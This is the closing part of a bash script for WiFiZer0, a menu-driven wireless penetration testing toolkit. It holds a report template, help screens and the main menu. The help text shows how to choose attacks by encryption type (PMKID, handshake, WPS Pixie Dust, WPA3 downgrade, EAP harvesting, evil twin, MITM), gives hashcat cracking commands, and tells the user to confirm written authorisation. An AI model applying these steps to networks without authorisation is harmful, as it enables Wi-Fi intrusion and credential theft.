.cover{background:#0369a1;color:#fff;padding:30px;border-radius:8px;margin-bottom:30px}
.cover h1{color:#fbbf24;border-color:#fbbf24}
.summary-box{display:inline-block;margin:10px;padding:15px 25px;border-radius:8px;font-size:1.2em;font-weight:bold;text-align:center}
.s-critical{background:#fee2e2;border:2px solid #dc2626}
.s-high{background:#ffedd5;border:2px solid #ea580c}
.s-medium{background:#fefce8;border:2px solid #eab308}
.s-info{background:#eff6ff;border:2px solid #60a5fa}
</style>
</head>
<body>
<div class="cover">
<h1>Wireless Penetration Testing Report</h1>
<p><strong>Client:</strong> ${client_name}</p>
<p><strong>Assessor:</strong> ${assessor}</p>
<p><strong>Date:</strong> ${report_date}</p>
<p><strong>Engagement:</strong> ${ACTIVE_PROFILE}</p>
<p><strong>Tool:</strong> WiFiZer0 v${VERSION}</p>
</div>

<h2>Executive Summary</h2>
<p>This report summarizes the findings from a wireless penetration testing engagement conducted on ${report_date}.</p>
<div>
<span class="summary-box s-critical">Critical<br>${crit_count}</span>
<span class="summary-box s-high">High<br>${high_count}</span>
<span class="summary-box s-medium">Medium<br>${med_count}</span>
<span class="summary-box s-info">Informational<br>${info_count}</span>
</div>

<h2>Findings</h2>
<table>
<tr><th>Severity</th><th>Finding</th><th>Timestamp</th><th>Detail</th></tr>
$(printf '%b' "$findings_html")
</table>

<h2>Recommendations</h2>
<ul>
<li><strong>Weak PSK:</strong> Implement a strong, randomized WPA2/WPA3 passphrase of at least 20 characters. Consider using WPA3-SAE where supported.</li>
<li><strong>MFP:</strong> Enable 802.11w Management Frame Protection (required mode) on all WPA2/WPA3 access points to prevent deauthentication attacks.</li>
<li><strong>WPS:</strong> Disable Wi-Fi Protected Setup (WPS) on all access points — Pixie Dust and PIN brute-force attacks can recover the PSK within minutes.</li>
<li><strong>Network Segmentation:</strong> Ensure wireless networks are segmented from wired networks with appropriate firewall policies.</li>
<li><strong>Monitoring:</strong> Deploy wireless intrusion detection/prevention systems (WIDS/WIPS) to detect rogue APs and deauth attacks.</li>
</ul>

<h2>Evidence Files</h2>
<table>
<tr><th>File</th><th>Size</th><th>SHA256 (first 16)</th></tr>
$(printf '%b' "$evidence_html")
</table>

<footer style="margin-top:40px;color:#888;font-size:0.85em;border-top:1px solid #ddd;padding-top:10px">
Generated by WiFiZer0 v${VERSION} on ${report_date}. For authorized testing only.
</footer>
</body>
</html>
HTMLEOF

    audit_log "REPORT GENERATED: $report_file"
    dialog --title " Report Generated " \
           --msgbox "\n  HTML report saved:\n  $report_file\n\n  Open in a web browser to view.\n  Findings: ${crit_count} critical, ${high_count} high, ${med_count} medium" \
           12 66
}

# ────────────────────────────────────────────────────────────
#  HELP / QUICK-START GUIDE
# ────────────────────────────────────────────────────────────
show_help() {
    local topic
    topic=$(dialog --title " WiFiZer0 Help " \
        --menu "\n  Select a topic:" \
        18 62 7 \
        "quickstart" "  Quick-Start — where to begin" \
        "attacks"    "  Attack decision guide by encryption" \
        "adapters"   "  Wireless adapter requirements" \
        "workflow"   "  Typical pentest workflow" \
        "output"     "  Where results are saved" \
        "tmux"       "  Using tmux tabs for parallel work" \
        "troubleshoot" "  Common problems & fixes" \
        3>&1 1>&2 2>&3) || return

    case "$topic" in
        quickstart)
            dialog --title " Quick-Start Guide " --msgbox "\
\n  STEP 1 — Scan\
\n    Menu item 1: Scan for Access Points\
\n    Select your wireless adapter when prompted.\
\n    Scan runs for 15 seconds, then shows all APs found.\
\n    Select an AP to set it as your current target.\
\n\
\n  STEP 2 — Choose an Attack\
\n    The menu will suggest the best attack for your target.\
\n    [>] prefix = attack is ready to launch\
\n    [!] prefix = needs a target selected first\
\n\
\n  STEP 3 — Crack\
\n    After capture, use menu item 10 (Crack Hashes).\
\n    Start with fasttrack wordlist (seconds),\
\n    then try rockyou.txt if that fails.\
\n\
\n  STEP 4 — Review Output\
\n    Menu item 12 shows all captured files.\
\n    Audit log: wpt_output/audit_YYYYMMDD_HHMMSS.log" \
            24 66 ;;
        attacks)
            dialog --title " Attack Decision Guide " --msgbox "\
\n  ENCRYPTION       RECOMMENDED ATTACK\
\n  ─────────────────────────────────────────────────────\
\n  WPA2 (PSK)    →  4) PMKID first  (no clients needed)\
\n                   3) Handshake if PMKID returns nothing\
\n                   5) WPS Pixie Dust if WPS is enabled\
\n\
\n  WPA3/WPA2     →  6) WPA3→WPA2 Downgrade (transition mode)\
\n  (transition)     4) PMKID (some transition APs respond)\
\n\
\n  WPA3 only     →  6) Downgrade (may not work on SAE-only)\
\n  (pure SAE)       No offline cracking is possible.\
\n\
\n  WPA-MGT       →  7) Enterprise EAP Harvest\
\n  (Enterprise)     Captures MSCHAPv2 → crack with hashcat\
\n\
\n  WEP           →  3) Capture frames (aircrack -a1)\
\n\
\n  Open / None   →  8) Captive Portal or 9) Bettercap MITM\
\n\
\n  The 'Suggest' line in the menu picks this automatically." \
            24 66 ;;
        adapters)
            dialog --title " Recommended Adapter Setup (2-3 Adapters) " --scrolltext --msgbox "\
\n  PROFESSIONAL SETUP: 2-3 ADAPTERS PER ASSESSMENT\
\n  ════════════════════════════════════════════════\
\n\
\n  ADAPTER 1  —  PRIMARY ATTACK  (REQUIRED)\
\n  Role: Monitor mode + packet injection (all attacks)\
\n  Used for: Scan, Handshake, PMKID, WPS, Downgrade, EAP\
\n\
\n  TOP PICKS (dual-band, 2.4+5 GHz):\
\n    Alfa AWUS036ACHM   MT7612U  — BEST all-rounder\
\n    Alfa AWUS036ACM    MT7612U  — compact, same chip\
\n    Alfa AWUS036ACH    RTL8812AU — excellent range\
\n    Panda PAU0D        MT7612U  — budget option\
\n\
\n  ADAPTER 2  —  SECOND MONITOR  (RECOMMENDED)\
\n  Role: Parallel attacks on a different band / channel\
\n  Use case: Scan 5GHz while attacking 2.4GHz target\
\n    → Same models as Adapter 1 (2nd identical unit)\
\n    → Or Alfa AWUS036NHA (2.4GHz only, RTL8188CUS)\
\n\
\n  ADAPTER 3  —  MITM / CONNECTED  (FOR BETTERCAP)\
\n  Role: Managed mode, connected to target network\
\n  Must have an IP address on the target network.\
\n    → Any adapter works (even built-in Wi-Fi card)\
\n    → Alfa AWUS036ACS (AC600) is a good compact pick\
\n\
\n  VERIFY YOUR ADAPTER SUPPORTS INJECTION:\
\n    sudo airmon-ng start wlan0\
\n    sudo aireplay-ng --test wlan0mon\
\n    (look for: Injection is working!)\
\n\
\n  DRIVER CHECK:\
\n    iw dev              — lists all wireless interfaces\
\n    lsusb               — shows USB adapter chipset\
\n    dmesg | tail -20    — kernel driver messages" \
            38 68 ;;
        workflow)
            dialog --title " Typical Pentest Workflow " --msgbox "\
\n  PRE-ENGAGEMENT\
\n    1. Confirm written authorisation covers the target\
\n    2. Identify target SSID(s) from scope document\
\n\
\n  RECONNAISSANCE  (Menu 1-2)\
\n    3. Scan APs — note all SSIDs, encryption, clients\
\n    4. Save to DB — select target from database (Menu 2)\
\n\
\n  EXPLOITATION  (Menu 3-9)\
\n    5a. WPA2 → try PMKID (Menu 4), then Handshake (Menu 3)\
\n    5b. WPS enabled → try Pixie Dust first (Menu 5)\
\n    5c. Enterprise → EAP Harvest (Menu 7)\
\n    5d. Open net → Captive Portal (Menu 8) or MITM (Menu 9)\
\n\
\n  POST-EXPLOITATION  (Menu 10-12)\
\n    6. Crack Hashes → fasttrack → rockyou → rules (Menu 10)\
\n    7. Review all captured output (Menu 12)\
\n    8. Document findings: credential = weak PSK / No MFA\
\n\
\n  CLEANUP  (Menu 13)\
\n    9. Cleanup & Exit restores all interfaces + saves report" \
            24 66 ;;
        output)
            dialog --title " Output File Locations " --msgbox "\
\n  All output is saved under:  ./wpt_output/\
\n\
\n  STRUCTURE\
\n  wpt_output/\
\n  ├── audit.log            — all actions timestamped\
\n  ├── session_*.txt        — session summary report\
\n  ├── ap_database.tsv      — persistent AP records\
\n  ├── client_database.tsv  — client MAC records\
\n  └── <SSID>_<timestamp>/\
\n      ├── capture-01.cap   — raw handshake capture\
\n      ├── pmkid.pcapng     — PMKID raw capture\
\n      ├── hashes.hc22000   — hashcat WPA2 hashes\
\n      ├── eap_creds.log    — MSCHAPv2 hashes\
\n      ├── bettercap.log    — MITM captured traffic\
\n      └── captive_creds.txt— portal credentials\
\n\
\n  HOW TO CRACK MANUALLY\
\n  WPA2:  hashcat -m 22000 hashes.hc22000 rockyou.txt\
\n  EAP:   hashcat -m 5600  eap_creds.log  rockyou.txt" \
            24 66 ;;
        tmux)
            dialog --title " Using tmux Tabs " --msgbox "\
\n  WiFiZer0 runs each attack in its own tmux window tab.\
\n  This lets you run multiple attacks simultaneously.\
\n\
\n  ESSENTIAL SHORTCUTS\
\n  ─────────────────────────────────────────────────────\
\n  Ctrl+b  n        — next tab\
\n  Ctrl+b  p        — previous tab\
\n  Ctrl+b  0        — jump to Main menu (tab 0)\
\n  Ctrl+b  1..9     — jump to a specific tab\
\n  Ctrl+b  w        — show interactive tab list\
\n  Ctrl+b  ,        — rename current tab\
\n  Ctrl+b  x        — close current tab\
\n\
\n  SCROLL MODE  (to read tab output)\
\n  Ctrl+b  [        — enter scroll mode\
\n  Arrow keys / PgUp / PgDn — scroll\
\n  q                — exit scroll mode\
\n\
\n  TIPS\
\n  • Run WiFiZer0 inside tmux:  tmux then ./wifi_pentest.sh\
\n  • Tab 0 is always the main menu" \
            24 66 ;;
        troubleshoot)
            dialog --title " Troubleshooting " --msgbox "\
\n  PROBLEM: Monitor interface not created\
\n  FIX: Kill interfering processes first:\
\n       airmon-ng check kill\
\n       Then retry the attack.\
\n\
\n  PROBLEM: Scan shows no APs\
\n  FIX: Verify adapter supports monitor mode:\
\n       iw dev   (should show 'type monitor' after start)\
\n       Try a different channel range (2.4 vs 5 GHz)\
\n\
\n  PROBLEM: Handshake capture gets 0 EAPOLs\
\n  FIX: Clients must be actively connected. Walk closer.\
\n       Increase deauth attempts or try PMKID instead.\
\n\
\n  PROBLEM: PMKID returns empty capture\
\n  FIX: AP does not support PMKID requests.\
\n       Use Handshake Capture (Menu 3) instead.\
\n\
\n  PROBLEM: hashcat 'No devices found'\
\n  FIX: Check GPU drivers:  hashcat -I\
\n       On VMs, use --force flag (slower, CPU only)\
\n\
\n  PROBLEM: bettercap MITM captures nothing\
\n  FIX: Ensure interface has an IP:  ip addr show\
\n       Gateway must be pingable:  ping <gateway>" \
            25 66 ;;
    esac
}

# ────────────────────────────────────────────────────────────
#  SUGGEST NEXT ATTACK  — one-line contextual hint for menu header
#  Outputs plain text (no ANSI — dialog does not render escapes)
# ────────────────────────────────────────────────────────────
suggest_next() {
    [[ -z "$TARGET_BSSID" ]] && return
    local enc="${TARGET_ENC^^}" auth="${TARGET_AUTH^^}"
    if   [[ "$auth" == *"MGT"* ]]; then
        echo "  Suggest: -> 7  Enterprise EAP Harvest  (captures MSCHAPv2 hashes)"
    elif [[ "$enc" == *"WPA3"* && "$enc" == *"WPA2"* ]]; then
        echo "  Suggest: -> 6  WPA3->WPA2 Downgrade  or  -> 4 PMKID  (transition mode)"
    elif [[ "$enc" == *"WPA3"* ]]; then
        echo "  Suggest: -> 6  WPA3->WPA2 Downgrade  (pure SAE resists PMKID/HS)"
    elif [[ "$enc" == *"OPN"* || -z "$enc" ]]; then
        echo "  Suggest: -> 8  Captive Portal  or  -> 9 Bettercap MITM"
    elif [[ "$enc" == *"WEP"* ]]; then
        echo "  Tip: WEP detected — use option 20 (WEP Attack Suite) for IV-based key recovery."
    else
        echo "  Suggest: -> 4  PMKID Clientless  (no clients needed, try first)"
    fi
}

# ────────────────────────────────────────────────────────────
#  MAIN MENU
# ────────────────────────────────────────────────────────────
main_menu() {
    while true; do
        # ── draw_banner with --no-clear avoids screen flash on each loop ──
        draw_banner --no-clear

        # ── Session settings line (band + default interface) ──────────
        local bd_lbl; bd_lbl=$(band_label)
        local iface_lbl="${GLOBAL_IFACE:-auto}"
        local session_line="Session: ${iface_lbl}  |  Band: ${bd_lbl}  |  Saves → wpt_output/$(
            case "$SELECTED_BAND" in 5) echo "5GHz";; dual) echo "dual";; *) echo "2.4GHz";; esac)/"

        # ── Target status line (richer: clients + vendor) ─────────────
        local target_line
        if [[ -n "$TARGET_SSID" ]]; then
            local cli_str="" vnd_str="" tgt_band_str=""
            [[ "$TARGET_CLIENT_COUNT" -gt 0 ]] 2>/dev/null && \
                cli_str=" | Clients:${TARGET_CLIENT_COUNT}"
            [[ -n "$TARGET_VENDOR" ]] && \
                vnd_str=" | ${TARGET_VENDOR}"
            local _tch="${TARGET_CHANNEL//[^0-9]/}"
            [[ "$_tch" -ge 36 ]] 2>/dev/null && tgt_band_str=" [5GHz]" || tgt_band_str=" [2.4GHz]"
            target_line="Target: ${TARGET_SSID}  |  ${TARGET_ENC}  |  CH:${TARGET_CHANNEL}${tgt_band_str}${cli_str}${vnd_str}"
        else
            target_line="  No target — run Scan (1) or load from AP Database (2)"
        fi

        # ── AP/client DB summary ──────────────────────────────────────
        local db_counts=""
        if [[ -n "$AP_DB" && -f "$AP_DB" ]]; then
            local n_ap n_cli
            n_ap=$(grep -c '^[^#]' "$AP_DB" 2>/dev/null) || n_ap=0
            n_cli=0
            if [[ -f "$CLIENT_DB" ]]; then
                n_cli=$(grep -c '^[^#]' "$CLIENT_DB" 2>/dev/null) || n_cli=0
            fi
            db_counts="  [DB: ${n_ap} APs / ${n_cli} clients]"
        fi

        # ── Contextual "next attack" suggestion ──────────────────────
        local suggest_line
        suggest_line=$(suggest_next)

        # ── tmux navigation hint ──────────────────────────────────────
        local tab_hint="  (relaunch inside tmux to enable multi-tab mode)"
        if [[ $TMUX_AVAILABLE -eq 1 ]]; then
            tab_hint="  Ctrl+b n/p=tabs  Ctrl+b w=list  Ctrl+b [num]=jump"
        fi

        # ── Attack item prefix — [>] ready, [!] needs target first ───
        local apfx="[!]"
        [[ -n "$TARGET_BSSID" ]] && apfx="[>]"

        local choice
        local _menu_h _term_h
        _term_h=$(tput lines 2>/dev/null || echo 40)
        _menu_h=$(( _term_h - 4 ))
        [[ $_menu_h -gt 56 ]] && _menu_h=56
        [[ $_menu_h -lt 20 ]] && _menu_h=20
        local n_scope=0
        [[ -f "$SCOPE_FILE" ]] && n_scope=$(grep -cv '^\s*#' "$SCOPE_FILE" 2>/dev/null || echo 0)
        local mac_info; mac_info=$(if [[ ${MAC_SPOOF_ENABLED:-0} -eq 1 ]]; then echo " [MAC:ON]"; else echo ""; fi)
        choice=$(dialog \
            --no-tags \
            --title " WiFiZer0 — Wireless Penetration Testing Toolkit v${VERSION} " \
            --menu "\n  $session_line\n  $target_line\n  $db_counts${suggest_line:+\n$suggest_line}\n\n$tab_hint\n" \
            "$_menu_h" 84 34 \
            ".s0"  " SESSION ─────────────────────────────────────────────────────────────" \
            "S"    "    Interface: ${iface_lbl}  |  Band: ${bd_lbl}${mac_info}  — Session Settings" \
            "S2"   "    Scope Management  [${n_scope} entries]" \
            "S3"   "    Engagement Profiles  [active: ${ACTIVE_PROFILE}]" \
            ".s1"  " RECON ───────────────────────────────────────────────────────────────" \
            "1"    "    Scan for Access Points + Client Discovery" \
            "2"    "    View / Select from AP & Client Database" \
            "15"   "    Probe for Hidden SSIDs  (passive + deauth)" \
            "16"   "    Client Probe Capture  (passive monitoring)" \
            ".b1"  " " \
            ".s2"  " ATTACK ──────────────────────────────────────────────────────────────" \
            "3"    "    ${apfx} WPA2 Handshake Capture + Hashcat Export" \
            "19"   "    ${apfx} Deauthentication Attack  (force reconnect / MFP test)" \
            "4"    "    ${apfx} PMKID Clientless Capture + Hashcat Export" \
            "5"    "    ${apfx} WPS Attack (Pixie Dust / PIN Brute-Force)" \
            "6"    "    ${apfx} EAPHammer: WPA3 -> WPA2 Downgrade" \
            "7"    "    ${apfx} EAPHammer: Enterprise EAP Credential Harvest" \
            "8"    "       EAPHammer: Captive Portal (Open AP)" \
            "9"    "       Bettercap: Network MITM + Credential Capture" \
            ".b2"  " " \
            ".s3"  " POST-EXPLOIT ────────────────────────────────────────────────────────" \
            "10"   "    Crack Captured Hashes (Hashcat)" \
            "17"   "    ${apfx} Verify Cracked PSK  (auto-connect test)" \
            "18"   "    ${apfx} Post-Crack Network Enumeration" \
            "13"   "    Generate HTML Report" \
            "14"   "    Wordlist Manager" \
            ".b3"  " " \
            ".s4"  " MANAGE ──────────────────────────────────────────────────────────────" \
            "11"   "    View / Switch / Kill Running Tasks  [${#RUNNING_TASKS[@]} tracked]" \
            "12"   "    View Captured Output Files" \
            "0"    "    Help & Quick-Start Guide" \
            "Q"    "    Cleanup & Exit" \
            ".s5"  " AUTO & ADVANCED ─────────────────────────────────────────────────────" \
            "20"   "    ${apfx} WEP Attack Suite         [IV-based crack]" \
            "21"   "       KARMA/MANA Evil Twin      [universal probe snare]" \
            "22"   "    ${apfx} Auto Attack Pipeline      [PMKID->crack->enum]" \
            ".b4"  " " \
            3>&1 1>&2 2>&3) || true

        case "$choice" in
            S)   session_settings ;;
            S2)  scope_management ;;
            S3)  profile_manager ;;
            1)   scan_aps ;;
            2)   view_ap_database ;;
            15)  discover_hidden_ssids_launcher ;;
            16)  probe_capture ;;
            3)   capture_handshake ;;
            19)  deauth_attack ;;
            4)   pmkid_capture ;;
            5)   wps_attack ;;
            6)   eaphammer_downgrade ;;
            7)   eaphammer_enterprise ;;
            8)   captive_portal ;;
            9)   bettercap_mitm ;;
            10)  hashcat_crack ;;
            17)  verify_psk_launcher ;;
            18)  post_crack_enum_launcher ;;
            13)  generate_report ;;
            14)  wordlist_manager ;;
            11)  view_running_tasks ;;
            12)  view_output ;;
            0)   show_help ;;
            20)  wep_attack ;;
            21)  karma_attack ;;
            22)  auto_attack_pipeline ;;
            Q)
                dialog --title " Exit WiFiZer0 " \
                       --yesno "\n  Exit WiFiZer0?\n\n  All running tasks will be terminated\n  and all interfaces will be restored." \
                       10 48
                if [[ $? -eq 0 ]]; then
                    break
                fi
                ;;
            .s*|.b*) ;;  # separator rows — ignore and redraw
            *)   ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════

# ── Tab subprocess path ──────────────────────────────────────
if [[ $_TAB_MODE -eq 1 ]]; then
    # Load the saved environment from the launcher window
    # (provides TMPDIR_PT, AUDIT_LOG, SESSION_START, and all target/task vars)
    [[ -f "$_TAB_ENV" ]] && source "$_TAB_ENV"
    mkdir -p "$TMPDIR_PT" "$OUTPUT_DIR" 2>/dev/null || true
    # Run the requested tab function
    if declare -f "$_TAB_FUNC" &>/dev/null; then
        "$_TAB_FUNC"
    else
        echo "Error: tab function '$_TAB_FUNC' not found."
    fi
    exit 0
fi

# ── Normal interactive path ──────────────────────────────────
# Secure temp directory — random suffix, mode 700
TMPDIR_PT=$(mktemp -d /tmp/wpt_XXXXXX) || {
    echo "FATAL: cannot create temp directory in /tmp — disk full or permissions issue?" >&2
    exit 1
}
chmod 700 "$TMPDIR_PT"

# Session metadata and persistent file paths
SESSION_START=$(date '+%Y-%m-%d %H:%M:%S')
mkdir -p "$OUTPUT_DIR"
chmod 700 "$OUTPUT_DIR"
AUDIT_LOG="${OUTPUT_DIR}/audit_$(date +%Y%m%d_%H%M%S).log"
SESSION_FILE="${OUTPUT_DIR}/session.sh"
AP_DB="${OUTPUT_DIR}/ap_database.tsv"
CLIENT_DB="${OUTPUT_DIR}/client_database.tsv"
DEP_OK_STAMP="${OUTPUT_DIR}/.dep_ok_stamp"
SCOPE_FILE="${OUTPUT_DIR}/scope.txt"
PROFILES_DIR="${OUTPUT_DIR}/profiles"
mkdir -p "$PROFILES_DIR"
[[ ! -d "${PROFILES_DIR}/default" ]] && mkdir -p "${PROFILES_DIR}/default"

audit_log "SESSION START: WiFiZer0 v${VERSION} host=$(hostname 2>/dev/null || echo ?) pid=$$"
audit_log "TMPDIR: $TMPDIR_PT"

check_root           # must run before any file modifications
write_dialogrc
ap_db_init           # create DB files if they don't exist yet
ensure_tmux
setup_venv
check_dependencies
offer_load_session   # restore previous engagement target if saved
offer_profile_picker # load a named engagement profile if any exist
main_menu
